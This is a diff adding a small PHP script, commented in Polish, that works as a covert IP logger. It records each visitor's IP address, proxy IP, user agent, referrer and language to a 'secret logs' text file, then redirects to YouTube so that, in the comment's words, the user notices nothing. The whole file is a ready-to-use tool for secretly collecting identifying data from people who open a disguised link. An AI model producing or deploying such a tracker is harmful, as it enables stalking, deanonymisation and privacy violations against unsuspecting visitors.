@@ -1,0 +1,26 @@
+<?php
+// 1. Zbieranie szczegółowych danych
+$data = [
+    'time'       => date('Y-m-d H:i:s'),
+    'ip'         => $_SERVER['REMOTE_ADDR'],
+    'proxy_ip'   => $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 'Brak',
+    'user_agent' => $_SERVER['HTTP_USER_AGENT'],
+    'referer'    => $_SERVER['HTTP_REFERER'] ?? 'Bezpośrednie wejście',
+    'language'   => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Nieznany',
+    'method'     => $_SERVER['REQUEST_METHOD']
+];
+
+// 2. Formatowanie wpisu do loga
+$logEntry = "--- NOWE WEJŚCIE ---\n";
+foreach ($data as $key => $value) {
+    $logEntry .= ucfirst($key) . ": " . $value . "\n";
+}
+$logEntry .= "---------------------\n\n";
+
+// 3. Zapis do pliku tekstowego (upewnij się, że plik ma uprawnienia do zapisu)
+file_put_contents("tajne_logi.txt", $logEntry, FILE_APPEND);
+
+// 4. Przekierowanie - użytkownik nic nie zauważy
+header("Location: https://www.youtube.com"); 
+exit();
+?>
